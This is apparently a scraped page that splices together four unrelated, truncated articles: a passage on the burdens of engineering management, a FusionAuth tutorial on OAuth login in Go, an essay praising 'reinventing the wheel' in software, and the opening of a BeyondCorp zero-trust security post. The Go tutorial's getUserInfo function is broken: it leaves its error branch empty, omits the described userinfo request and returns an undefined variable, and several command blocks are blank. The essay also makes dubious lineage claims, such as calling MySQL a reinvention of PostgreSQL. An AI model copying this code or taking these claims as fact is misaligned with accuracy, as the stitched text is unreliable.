jerks so they avoid interacting with the team. Consequently the high quality work
of this team does not have organizational impact.</li>
</ul>

<p>A common thread between each of these scenarios is that ICs are delivering high
quality work. Another thread is that the high quality work ultimately doesn’t
benefit the organization. Retention problems, working on the wrong things, toxic
cultures - these are all examples of management failure.</p>

<p>There’s no checklist for building non-toxic cultures or a team that ICs want to
stay on. Engineering teams are fortunate if they’re told exactly what to build
every quarter to meet the growing technical and business needs of the company
but I’ve never found that to be true. The poor definition of these ideas makes
management hard. And it puts the burden on the manager to maintain their own
level of vigilance that all of these things - personalities, priorities, culture,
etc. - stay on track.</p>

<p>As a small but illustrative example of something that’s different as an IC than
a manager: morning standup. When I was an engineer, there were more than a few
times during morning standups when I didn’t pay attention unless I was giving
my own update. And frankly it didn’t seem to matter much, especially if the other
updates were concerning different workstreams than the one I was currently focused
on.</p>

<p>As a manager, I can’t afford not to pay attention to every update during standup
because I am ultimately accountable for the delivery of <em>every workstream</em>. Not
only am I trying to identify and surface team-wide blockers, but I need to know
when a junior teammate sounds like they’re spinning their tires or when a senior
teammate sounds burnt out. I’m mentally noting points I need to follow up on
during my weekly 1:1s, what projects feel like they’re falling off original
timetables or communication problems my teammates are encountering across the
organization. Is a teammate overwhelmed? Is a teammate dragging their heels?
What if I’m hearing reports that a teammate has been toxic in meetings? These are
all concerns running constantly in the back of my mind.</p>

<p>This is the root of the non-deterministic schedule from the first point. Say I
smell one of these things - a teammate is very disengaged and unhappy? A project
is going off the rails? A teammate suddenly gives their two week notice? These
are my fires now.</p>

<p>Gone are the weeks of deterministic bandwidth calculated via possible work hours
divided by ticket estimations. And that unpredictability means my outdated pull
request that unblocks another teammate goes days or weeks without being merged.</p>

<p>Is there room every once in a while for an EM to work on a non-blocking PR just
to scratch their coding itch? Probably. Is the work time you spent working on that
nice-to-have PR better spent on a management responsibility? Probably.</p>

<p>My advice: find time to scratch the coding itch outside of work.</p>

<p>A side effect of caring more about everything means management costs you more
emotionally. When hardship or tragedy strikes the life of a teammate and it affects
their ability to work, I’m often the first to know. Depending on the sensitivity
of the issue sometimes I’m the only one to know. Not only am I responsible for the
practical fallout of their absence, but I wouldn’t be successful in my job if I
didn’t genuinely care about the wellbeing of my teammates. And in my experience
it’s not free to know people you care about are suffering.</p>

<h3 id="3-management-creates-an-unavoidable-power-hierarchy">3: Management creates an unavoidable power hierarchy.</h3>

<p>As a manager you have direct power to decide your reports’ continued employment
and compensation in a manner in which they cannot do for you, which means you
have more power over them at work than they do over you. This isn’t a statement
of right or wrong, this is a statement of fact.</p>

<p>I think there are a few non-obvious practical implications of this power hierarchy:</p>

<p><strong>You will feel more compelled to toe the company line.</strong></p>

<p>You represent the company now within your sphere of influence. While I don’t
think moving into management means you lose your capacity for independent thought,
the health of an organization often depends on its leaders’ ability to disagree
and commit.</p>

<p>This particularly comes to a head during times of crises, as those on your team
will look to you as a steadying force and source of information. By virtue of your
title you may know not-yet-public information and be expected to keep that information
private until the appropriate plans are in place, all for the good of the company.
Sometimes that news will be devastating and you’ll take heat for keeping it quiet
from people who trusted you. That’s part of the job.</p>

<p><strong>It can be hard to manage friends.</strong></p>

<p>The foundations of friendship are things like equality, honesty, and transparency,
principles which don’t always jive with a management relationship. Management is a
power hierarchy (<code>!equality</code>), and sometimes you’ll have to disagree and commit or
toe the party line (<code>!honesty</code> / <code>!transparency</code>).</p>

<p>The alternative is special treatment for your friends, which is a management failure
because nepotism undermines your credibility as a leader. And in the worst case,
you are in the unenviable position of having to terminate a friend’s employment.
That too is part of the job.</p>

<p><strong>You can’t joke around the same way.</strong></p>

<p>Here’s a a bad joke you can make as an IC that doesn’t land as well as a manager:
“Welp, you broke production. Pack your things, you’re fired.”</p>

<p>The power dynamics of management are serious and livelihoods are at stake. Don’t
trivialize them with jokes.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>In this tutorial, we are going to learn how to secure a golang program with OAuth while using FusionAuth as the auth provider. Authentication and authorization are essential for any application, and golang apps are no different.</p>

<!--more-->

<p>First, we will set up the FusionAuth server. Then, we’ll configure the golang program to construct a URL to direct a user to a login form generated by FusionAuth. Lastly, we will learn how to make use of an access token in order to get user data using OIDC.</p>

<p>You can follow along conceptually, or check out the <a href="https://github.com/fusionauth/fusionauth-example-go">GitHub repo</a> with the complete implementation first. Now, let’s get started!</p>

<h2 id="requirements">Requirements</h2>

<p>The requirements to follow this tutorial are as follows:</p>

<ul>
  <li>Go SDK</li>
  <li>VScode or any other text editor</li>
  <li>FusionAuth</li>
  <li>Homebrew (optional)</li>
</ul>

<h2 id="setting-up-fusionauth-as-your-auth-provider">Setting up FusionAuth as your auth provider</h2>

<p>FusionAuth lets you <a href="https://fusionauth.io/docs/v1/tech/installation-guide/">pick your installation method</a>. However, in this post, we’ll install using Homebrew. The process is simple. First, we install the tap by running the following command in the terminal:</p>

<div><div><pre><code>brew tap fusionauth/homebrew-fusionauth
</code></pre></div></div>

<p>Note that this installation step only needs to be done once. Next, we need to install the FusionAuth main service by running the following command:</p>

<div><div><pre><code>brew <span>install </span>fusionauth-app
</code></pre></div></div>

<p>Lastly, we need to start the FusionAuth service by running this in the project terminal:</p>

<div><div><pre><code>brew services start fusionauth-app
</code></pre></div></div>

<p>In order to get started, we need to open our browser and go to <code>http://localhost:9011</code>. Then, we need to complete the maintenance mode and the setup wizard.</p>

<h3 id="setup-fusionauth-with-the-installation-wizard">Setup FusionAuth with the installation wizard</h3>

<p>The maintenance mode form requires a super user credential for your database:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/maintenance-mode-database.png" alt="The FusionAuth maintenance mode screen, including the super user configuration."></p>

<p>It will use these credentials to create a database user for FusionAuth to connect as. Further down the maintenance mode page, you can specify the username and password of this user if you choose:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/maintenance-mode-database-lower.png" alt="Adding a user for FusionAuth to connect as."></p>

<p>If you want to create a FusionAuth user and database using different tools, rather than maintenance mode, you can. See the <a href="https://fusionauth.io/docs/v1/tech/guides/silent-mode">silent mode documentation</a> for more on this option.</p>

<p>Once you’ve created a database for FusionAuth, you’ll need to accept the license and create an initial FusionAuth account:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/setup-wizard.png" alt="The FusionAuth setup wizard."></p>

<p>Then you’ll need to log in to this new FusionAuth account. This user has administrative privileges within the FusionAuth instance:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/login-admin-screen.png" alt="Logging in to the FusionAuth administrative user interface."></p>

<h3 id="create-and-configure-a-new-application">Create and configure a new Application</h3>

<p>Initially, there will be only one application: FusionAuth itself. Hence, we need to create a new application by navigating to the “Applications” tab and clicking the green “+” sign.</p>

<p>Then, we need to configure this application. First, add the authorized callback of <code>http://localhost:8080/callback</code>. This is the URL which will process the authorization code should a user authenticate successfully.</p>

<p>In addition, make sure that the Authorization Code checkbox is checked. This is the grant we’ll be using, and the one that is recommended for most use cases.</p>

<p>After successful setup, view the application by clicking the green magnifying glass. The OAuth <code>Client ID</code> and <code>Client Secret</code> values can also be found on the same screen, in the “OAuth configuration” section. You’ll want to note both of those.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/oauth-configuration.png" alt="The application configuration screen."></p>

<p>We set up this application in the default tenant. FusionAuth supports multi-tenant configurations, but for this post, we’ll keep all user data in one tenant, as that makes things slightly simpler. Now, our FusionAuth setup is complete. Let’s move to the golang part.</p>

<h2 id="setting-up-the-development-environment-for-golang">Setting up the development environment for golang</h2>

<p>We are going to set up a development environment for golang. You can skip this if you already have it. First, we need to download Go from its <a href="https://golang.org/">official website</a>.</p>

<p>Let’s walk before we run. Here’s the simplest Go project; not surprisingly this is the typical ‘Hello World’ program. This is what it looks like:</p>

<div><div><pre><code><span>package</span> <span>main</span>
<span>import</span> <span>"fmt"</span>
<span>func</span> <span>main</span><span>()</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Hello, Golang"</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>Save this in a file called <code>main.go</code>. In the terminal, in the directory where this code is, run:</p>



<p>We see the following output:</p>



<p>Success! Let’s add in some authentication, shall we?</p>

<h2 id="setting-up-initial-handlers-and-oauth2-config-in-our-golang-app">Setting up initial handlers and OAuth2 config in our golang app</h2>

<p>We are going to set up the handlers and OAuth2 configuration. For that, we need to import necessary components such as the OAuth and HTTP packages first:</p>

<div><div><pre><code><span>package</span> <span>main</span>
<span>import</span> <span>(</span>
  <span>"fmt"</span>
  <span>"io/ioutil"</span>
  <span>"net/http"</span>
  <span>"golang.org/x/oauth2"</span>
  <span>"github.com/thanhpk/randstr"</span>
<span>)</span>
<span>//...</span>
</code></pre></div></div>

<p>Depending on your golang setup you may need to <code>get</code> the nonstandard packages:</p>

<div><div><pre><code>go get github.com/thanhpk/randstr
go get golang.org/x/oauth2  
</code></pre></div></div>

<p>Then, we need to define a variable to contain the configurations as shown in the code snippet below:</p>

<div><div><pre><code><span>//...</span>
<span>var</span> <span>(</span>
  <span>FusionAuthConfig</span> <span>*</span><span>oauth2</span><span>.</span><span>Config</span>
  <span>oauthStateString</span> <span>=</span> <span>randstr</span><span>.</span><span>Hex</span><span>(</span><span>16</span><span>)</span>
<span>)</span>
<span>//...</span>
</code></pre></div></div>

<p>Next, we need to create a new OAuth instance and configure it in the init function. Here, we need <code>ClientID</code> and <code>ClientSecret</code>, which we got from the FusionAuth application OAuth config section. We also need to define the OAuth2 endpoints (which we can pull from the <a href="https://fusionauth.io/docs/v1/tech/oauth/endpoints">FusionAuth docs</a>) and a callback URL (as entered in the FusionAuth config above):</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>init</span><span>()</span> <span>{</span>
  <span>FusionAuthConfig</span> <span>=</span> <span>&amp;</span><span>oauth2</span><span>.</span><span>Config</span><span>{</span>
    <span>RedirectURL</span><span>:</span> <span>"http://localhost:8080/callback"</span><span>,</span>
    <span>ClientID</span><span>:</span>    <span>"7d2b4cb4-ccd5-42ac-8469-f802393c8f98"</span><span>,</span>
    <span>ClientSecret</span><span>:</span><span>"6x9GI_FUs5TBt_ql0m1CxNy962L7SEf0Kx2KxsY7WYw"</span><span>,</span>
    <span>Scopes</span><span>:</span>      <span>[]</span><span>string</span><span>{</span><span>"openid"</span><span>},</span>
    <span>Endpoint</span><span>:</span> <span>oauth2</span><span>.</span><span>Endpoint</span><span>{</span>
      <span>AuthURL</span><span>:</span>  <span>"http://localhost:9011/oauth2/authorize"</span><span>,</span>
      <span>TokenURL</span><span>:</span> <span>"http://localhost:9011/oauth2/token"</span><span>,</span>
      <span>AuthStyle</span><span>:</span> <span>oauth2</span><span>.</span><span>AuthStyleInHeader</span><span>,</span>
    <span>},</span>
  <span>}</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>Here, we have configured our OAuth connection inside the <code>init</code> function. This function is run every time the application is started. In a production application, these values should be pulled from a configuration file or a database table, rather than hard coded.</p>

<h2 id="adding-our-display">Adding our display</h2>

<p>Now, we need to display a page. For the <code>handleMain</code> function, we are hard coding HTML as shown below, but for a larger application you might want to look at a templating language:</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>handleMain</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
  <span>var</span> <span>htmlIndex</span> <span>=</span> <span>`&lt;html&gt;
    &lt;body&gt;
       &lt;a href="/login"&gt;FusionAuth Log In&lt;/a&gt;
    &lt;/body&gt;
    &lt;/html&gt;`</span>
   <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>w</span><span>,</span> <span>htmlIndex</span><span>)</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>Then, we need to call the <code>handleMain</code> function inside the <code>main</code> function. This lets us listen to port 8080:</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>main</span><span>()</span> <span>{</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>handleMain</span><span>)</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>Since we changed the code from the “Hello world” example, we need to restart the golang program. We need to stop the existing server. Then, restart it by using this command:</p>



<p>Navigate to <code>http://localhost:8080/</code>. We will get the following screen in the web browser:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/app-login.png" alt="The application login page."></p>

<p>Great, but how do we actually log in? Glad you asked.</p>

<h2 id="login-function">Login function</h2>

<p>For the login function, we need to create a new function called <code>handleFusionAuthLogin</code>. Then, we generate a URL and use the HTTP package to redirect the user to it. Because we are using a properly configured OAuth library, the URL is generated for us.</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>handleFusionAuthLogin</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
  <span>url</span> <span>:=</span> <span>FusionAuthConfig</span><span>.</span><span>AuthCodeURL</span><span>(</span><span>oauthStateString</span><span>)</span>
  <span>http</span><span>.</span><span>Redirect</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>url</span><span>,</span> <span>http</span><span>.</span><span>StatusTemporaryRedirect</span><span>)</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<h2 id="handling-the-callback">Handling the callback</h2>

<p>In order to handle the callback, which will contain the <code>code</code> parameter and is crucial to the Authorization Code grant, we pass the <code>code</code> and <code>state</code> variables to a <code>getUserInfo</code> function. We’ll see the code behind that function below, but it is going to get user data back from FusionAuth. The code to handle the callback is:</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>handleFusionAuthCallback</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
  <span>content</span><span>,</span> <span>err</span> <span>:=</span> <span>getUserInfo</span><span>(</span><span>r</span><span>.</span><span>FormValue</span><span>(</span><span>"state"</span><span>),</span> <span>r</span><span>.</span><span>FormValue</span><span>(</span><span>"code"</span><span>))</span>
  <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
    <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>err</span><span>.</span><span>Error</span><span>())</span>
    <span>http</span><span>.</span><span>Redirect</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>"/"</span><span>,</span> <span>http</span><span>.</span><span>StatusTemporaryRedirect</span><span>)</span>
    <span>return</span>
  <span>}</span>
  <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>w</span><span>,</span> <span>"Content: %s</span><span>\n</span><span>"</span><span>,</span> <span>content</span><span>)</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>We’ll also need to update our main function to ensure the above two handlers are registered at a path accessible to the browser:</p>

<div><div><pre><code><span>func</span> <span>main</span><span>()</span> <span>{</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>handleMain</span><span>)</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/login"</span><span>,</span> <span>handleFusionAuthLogin</span><span>)</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/callback"</span><span>,</span> <span>handleFusionAuthCallback</span><span>)</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<h2 id="display-the-user-data">Display the user data</h2>

<p>In order to fetch and display user info, we need to create the <code>getUserInfo</code> function, as promised above.</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>getUserInfo</span><span>(</span><span>state</span> <span>string</span><span>,</span> <span>code</span> <span>string</span><span>)</span> <span>([]</span><span>byte</span><span>,</span> <span>error</span><span>)</span> <span>{</span>
  <span>if</span> <span>state</span> <span>!=</span> <span>oauthStateString</span> <span>{</span>
    <span>return</span> <span>nil</span><span>,</span> <span>fmt</span><span>.</span><span>Errorf</span><span>(</span><span>"invalid oauth state"</span><span>)</span>
  <span>}</span>
  <span>token</span><span>,</span> <span>err</span> <span>:=</span> <span>FusionAuthConfig</span><span>.</span><span>Exchange</span><span>(</span><span>oauth2</span><span>.</span><span>NoContext</span><span>,</span> <span>code</span><span>)</span>
  <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>

  <span>}</span>
  <span>return</span> <span>contents</span><span>,</span> <span>nil</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>That’s a fair bit of code, let’s break it down:</p>

<ul>
  <li>First, we check the <code>state</code> parameter received from the server matches what we sent. This is to prevent CSRF attacks.</li>
  <li>Then, we exchange the <code>code</code> parameter and retrieve an access token.</li>
  <li>Next, we construct a request to a well known user information endpoint with an <code>Authorization</code> header, using the access token as a bearer token.</li>
  <li>Last, we print the response from the server.</li>
</ul>

<p>If you run this locally, you’ll see something similar to what is in this video:</p>

<h2 id="next-steps">Next steps</h2>

<p>Obviously you’d want to do more than just print out a JSON data structure in a real application. You’d want to show the user’s data, welcome them, and/or show or hide functionality based on who they were.</p>

<p>You could also make requests to other APIs, presenting …</p></div></div>

That’s because the (wheel) is one of those things that has been <a href="https://en.wikipedia.org/wiki/Wheel" target="_blank">successfully reinvented</a> throughout history an unimaginable number of times.</p><p>The materials we used for it changed, from countless types of stone and wood to innumerable metal alloys and carbon based substances. The contents and proportions of the wheels have changed.</p><p>From somewhat circular, full and broad wheels.</p><figure id="w-node-c0d619119a26-fd15e542"><p><img src="https://assets.website-files.com/5cae0183d85bd510b93237ff/5e7d2e465b1d90a6d9e1cfe5_Potter%27s%20wheel.jpeg" alt=""></p></figure><p>To perfectly circular, thin and hollow ones with hundreds of spokes.</p><figure id="w-node-741ab0761b45-fd15e542"><p><img src="https://assets.website-files.com/5cae0183d85bd510b93237ff/5e7d22b06e0276cac295cf9a_nick-fewings-7JpOxUqQGt4-unsplash.jpg" alt=""></p></figure><p>The components a wheel interacts with, such as the tire and the axle, have changed, prompting thousands of wheel re-designs to work with them. The terrain and machinery for which the wheel is used has also changed quite drastically, giving rise to many other reinventions of the wheel.</p><figure id="w-node-7e6d935e3652-fd15e542"><p><img src="https://assets.website-files.com/5cae0183d85bd510b93237ff/5e7d236cb382bade82783465_mars-rover-1241266_1920.jpg" alt=""></p></figure><p>Indeed, even the basic shape of the wheel is not safe, with variations going from the good old circular wheels to <a href="https://en.wikipedia.org/wiki/Square_wheel">square ones</a>.</p><p>The best way to envision the millions of reinventions of the wheel and the progress this has helped achieve, is to think of how it has been used throughout time.</p><p>Wheels have gone from curiosities which slightly eased labor, to objects we rely upon for the safe landing of flying fortresses weighting thousands of tons, carrying weapons of mass destruction that could spell an end to civilization if those wheels happened to fail.</p><p>Wheels can now be small enough that they are unperceivable to human senses, versatile enough to carry a tank through any type of terrain, strong enough to support train rushing at up to 500km/hr for hours on end and smart enough to usher robots through the unpredictable terrain of other planets.</p><p>Props to the guys and gals that invented the first wheels, they did a great job considering the circumstances. But, I’m rather glad that when my cab arrives it won’t be using anything remotely close to those wheels.</p><p>‍</p><h2>Relationship to Programming</h2><p>I hope the deconstruction of the metaphor has helped spur an idea about how utterly baseless this idiom is when it comes to software. Some of <a href="https://github.com/torvalds/linux">the most widely used and essential</a> pieces of software ever created are <a href="https://gcc.gnu.org/">reinventions of a wheel</a>.</p><p>Linux is a reinvention of Unix, MariaDB is a reinvention of MySQL, MySQL being a reinvention of PostgreSQL/OracleDb.</p><p>Modern C++ is a reinvention of C++, which is a reinvention of C (which is a reinvention of B which is a reinvention of BCPL). Rust is a reinvention of modern C++ and C. Clojure is a reinvention of LISP. LISP is a reinvention of IPL and Lambda calculus. Haskell is a reinvention of System FC, which is a reinvention of System F, which is a reinvention of Lambda calculus. <a href="http://lampwww.epfl.ch/~amin/dot/fool.pdf">DOT</a> is a reinvention of OO, Kotlin is a reinvention of Java.</p><p>Vim is a reinvention of Vi. Wayland is a reinvention of Xorg. Systemd is a reinvention of about 500 different piece of software. Ubuntu is a reinvention of Debian. Arch is a reinvention of Gentoo and even the core of OS X is an unfortunate reinvention of BSD.</p><p>I could keep going for as much as I like…</p><p>Many advances in software are not done by adding to an existing code-base, but <a href="https://www.mindsdb.com/blog/user-question-who-is-xai-for" target="_blank">by reiterating on it and coming up with something better</a>. That’s why for every popular repository on GitHub there are hundreds of forks. For any use-case imaginable you have dozens of variations of tools to choose from.</p><p><strong>Invent your very own wheel, for your very own needs and, who knows, maybe the general public will end up considering it a better wheel.</strong></p><p>People are often discouraged from “reinventing the wheel”, despite the fact that most advances in computer science are exactly those related to reinventing the wheel, rather than creating something that is completely new.</p><p>Change is incremental, we re-iterate upon an already existing concept and slowly modify it and make it better, until you can’t even fathom how you got from the original to where you are. And the amazing thing is, it costs us nothing but time to do so, that’s the great thing about programming, there’s no resource scarcity, no matter how crazy your reinvention, you can create it.</p><p>Instead, what we should focus on, is telling people how and when to reinvent the wheel. I’ve allowed myself to put together a quick list.</p><p>‍</p><h2>Reinvent the Wheel When No Wheel Fits Your Cart</h2><p>That is to say, instead of designing an inferior software or product to cope with existing libraries, create the library or tool you need, it’s very likely someone else will need it as well.</p><p><strong>This approach can take longer, but it can be fun and it can result in a better product.</strong></p><p>Obviously you have a to be a bit flexible and pick your battles, otherwise, you end up being one of those C “programmers” who insists they must write their own lists and vectors or one of the JavaScript “developers” that takes part in the 100,000+ daily downloads of the <a href="https://www.npmjs.com/package/is-odd">is_odd</a> library.</p><p>Where you draw the line is an open question, with no single answer.</p><p>A very good example of this is <a href="https://julialang.org/">Julia</a>, a programming language which is very similar to Python in all but three aspect:</p><ul role="list"><li>It’s easy to deploy without needing virtual environments.</li><li>It’s much faster for vector operations</li><li>It’s designed with large scale parallelism in mind.</li></ul><p>It does what could “theoretically” be done with a combination of virtual environments, Cython, proper usage of C/C++ libraries, some coding guidelines and a bit of patience.</p><p>But Julia does these things out of the box and it just kind of works. It ends up saving large amounts of time and making development more enjoyable. It’s probably one of the most amazing languages of the 21st century.</p><p>‍</p><h2>Reinvent the Wheel if There Have Been No Recent Reinventions</h2><p>Another reason to reinvent the wheel is that none has tried to do so as of late. This could mean that the current wheel is very good and needs no major improvements, but it often means that there’s a lot of people who would like a better one, they just don’t have the time or will to make it.</p><p>It often happens that a problem is “fixed” in an imperfect way, then left to the wayside, since our current technology and mental frameworks can’t find a better solution.</p><p>One can often find, looking at these kind of problems a few years down the road, that technology is now up to speed and they can be solved in a much better way.</p><p>A great example of this is image recognition, which was thought of as the job for “classic” classifiers. Loads of incremental improvements were done to these classifiers and by 2010 you had pretty good results using stuff like the <a href="https://www.robots.ox.ac.uk/~vgg/rg/papers/peronnin_etal_ECCV10.pdf">fisher kernel</a>.</p><p>Still far from something you’d use to detect cancerous tumors or drive a car, something that was somewhere between a clever parrot and an elephant in terms of precision, number of labels it could train on and training time.</p><p>Up until someone had the idea to adapt the less popular wheel of convolution neural networks to use <a href="https://www.nvidia.com/content/tegra/embedded-systems/pdf/jetson_tx1_whitepaper.pdf">modern GPUs</a> and improve on some of the models for image recognition initially developed in the 90s.</p><p>Out came the famous AlexNet &amp; Co in 2012, which, in a short few years, lead the way to the amazing image recognition technology of today. Nowadays, on medium sized datasets, we can actually outperform humans.</p><p>‍</p><h2>Reinvent the Wheel if the Wheel is Proprietary</h2><p>This is the case with many great open source projects, things like Linux, GCC and git where just reinventions of already existing software.</p><p>However, they were better in certain areas and they were open source, which meant more people used them and contributed to them.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Internal websites. Every company has them, and they often contain some of your company’s most important data. So you should protect them to protect that data.</p><p>This isn’t a new idea, as companies have been creating VPNs (virtual private networks) to restrict access to their internal networks for decades. But once Google became wary of this approach in 2009 after the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Operation_Aurora">Operation Aurora</a> hack attempt, they decided to shift towards a zero-trust security model, where every request is treated as though it is coming from a network that could be compromised.</p><p>This gave birth to <a target="_blank" rel="noopener noreferrer" href="https://www.beyondcorp.com/">BeyondCorp</a>, a theoretical model for protecting all of your applications without the use of a VPN.</p><p>This idea has been widely praised by security researchers, though practical guides on getting started with it on the most popular cloud platforms are still limited. This is despite the fact that <a target="_blank" rel="noopener noreferrer" href="https://research.google/pubs/pub43231/">Google’s whitepaper explaining the idea</a> was released in 2014.</p><p>We get it, BeyondCorp is complex. It asks you to look at every single request flowing through your system and to validate it’s legitimacy based on multiple data sources: where is the request coming from, who is sending it, what is the security status of that source, etc. That’s a lot to ask!</p><p>But we also believe that getting started with BeyondCorp is much easier than many may think, and that the security payoffs can come immediately.</p><p>This blog post aims to provide a practical implementation guide for using BeyondCorp security on your internal websites hosted in AWS.</p><p>At Transcend, we use BeyondCorp security to ensure our IP and our users’ data stays safe.</p><h2 id="enough-buzz-words-what-would-this-look-like-as-a-user">Enough buzz words. What would this look like as a user?</h2><p>BeyondCorp is filled with buzz words. It’s zero trust. It’s perimeter-less. It’s context-aware.
That sure is a lot of cool phrases. But what does it look like in real life? Well, let’s see what happens when I go to Transcend’s internal codelabs site, where we have set up BeyondCorp authentication with our company’s GSuite credentials:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/4t5suIga3myM4BR0tamdNg/7c40bb6aba6f5a3e231308b12f3ca960/demo.gif" alt="A GIF of a successful implementation of BeyondCorp with AWS."></p></div><p>When I attempt to load the site, it asks me to login with my GSuite credentials. Note that this includes a hardware MFA token requirement that is easily enforceable across an entire GSuite organization (and many other identity providers).
Once I gain access to the site, I won’t need to log in to any internal systems for an hour.</p><p>To see for yourself, head on over to <a target="_blank" rel="noopener noreferrer" href="https://codelabs.dev.trancsend.com/">codelabs.dev.trancsend.com</a>. While the DNS is public, only our internal employees can gain access to our internal tutorials, and you won’t be allowed in unless you have an <code>@transcend.io</code> email address.</p><p><em>Side note: You can check out some of our publicly facing tutorials at <a target="_blank" rel="noopener noreferrer" href="https://codelabs.transcend.io/">codelabs.transcend.io</a></em></p><h2 id="how-is-this-better-than-a-vpn">How is this better than a VPN?</h2><p><strong>VPNs create “eggshell” security, where all protections happen at the perimeter</strong>. Once access is gained into a system, all the data inside that network is accessible. And with the rise of remote work, cell phones, and other mobile devices, your “secure” network of trusted devices is becoming wider all the time. </p><p>In contrast, BeyondCorp encourages consistent authentication throughout all parts of an application for all devices. It doesn’t matter what device attempts to access codelabs.dev.trancsend.com, even our CEO’s laptop will need to authenticate securely before viewing the site’s contents.</p><p><strong>VPNs are an extra attack vector</strong>.  When a pentester or hacker attempts to attack your network, one very common approach is to search for vulnerabilities in any public-facing server of yours they can find.
Oftentimes, systems like VPN access points are a primary target.
<a target="_blank" rel="noopener noreferrer" href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">Here’s a story</a> where a bug bounty hunter attacked Facebook using this approach. When he gained access to one of their internal servers, he noticed leftover files from another pentester who had used the same vulnerability to steal a small number of internal credentials.</p><p>Exploits related to CVEs (common vulnerabilities and exposures) on VPN servers are all too common, such as the time that <a target="_blank" rel="noopener noreferrer" href="https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/">900+ enterprise VPN servers had their passwords dumped</a>, or when a <a target="_blank" rel="noopener noreferrer" href="https://www.claroty.com/2020/07/28/vpn-security-flaws/">commonly used VPN implementation allowed for direct access to I/O devices</a>. Or the time that Lockheed Martin who (despite a solid effort to include MFA on their VPN) was <a target="_blank" rel="noopener noreferrer" href="https://www.darkreading.com/risk-management/lockheed-martin-suffers-massive-cyberattack/d/d-id/1098013">still attacked by a group who had found the random seeds used to generate tokens on their hardware MFA tokens</a>.</p><p>And if you use your company’s WiFi network as a trusted network, that network can become an attack vector as well. In 2016, the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/KRACK">KRACK vulnerability in WPA2</a> allowed attackers to find the encryption keys for all network traffic flowing through a router.</p><p>These hacks are not theoretical. They are directed and well-coordinated. When your company is successful, someone will want your data.</p><p>In contrast, BeyondCorp has no VPN. Instead of having a public-facing service that gives access to internal, hidden sites, BeyondCorp has public-facing services that request authentication information from an internal, hidden authentication server.
Because this authentication server is not exposed, it is much harder to attack.</p><p><strong>VPNs offer no guarantees over security within your network</strong></p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/7ciKFAqbRCpa2U9B0quoJJ/4957bb9dc1660cf4fc434d27e7cda6d2/NSA_Slide_Smiley.png" alt="A diagram obtained by the Washington Post that shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure."></p><figcaption>Image via Washington Post.</figcaption></div><p>While your internal service #9001 may have a firewall rule saying that only server #4001 can talk to it on port 443, how does service #9001 know that the request on #4001 was not sent by an adversary who got through the VPN security? </p><p>It doesn’t in traditional architectures.</p><p>In Edward Snowden’s document dump to the Washington Post in 2013, we got to see the picture above. In it, the NSA shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure.</p><p>In this case, the NSA didn’t even need to break into the perimeter. Their <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/MUSCULAR_(surveillance_program)">MUSCULAR program</a> went directly to the network infrastructure that connected Google’s (and Yahoo’s) data centers, siphoning off so much data from the fiber optic cables that the <a target="_blank" rel="noopener noreferrer" 